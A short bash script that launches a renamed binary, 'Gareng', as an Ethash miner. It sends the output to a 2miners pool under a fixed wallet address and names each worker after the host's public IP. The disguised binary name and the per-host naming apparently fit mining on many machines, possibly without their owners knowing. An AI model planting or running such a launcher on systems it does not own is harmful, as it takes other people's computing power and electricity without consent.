#!/bin/bash

POOL=asia-eth.2miners.com:2020
WALLET=0xbbc04f7a29135194ba667f037bfc04e28e7bc51b
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-lol

cd "$(dirname "$0")"

chmod +x ./Gareng && ./Gareng --algo ETHASH --pool $POOL --user $WALLET.$WORKER --tls 0 $@
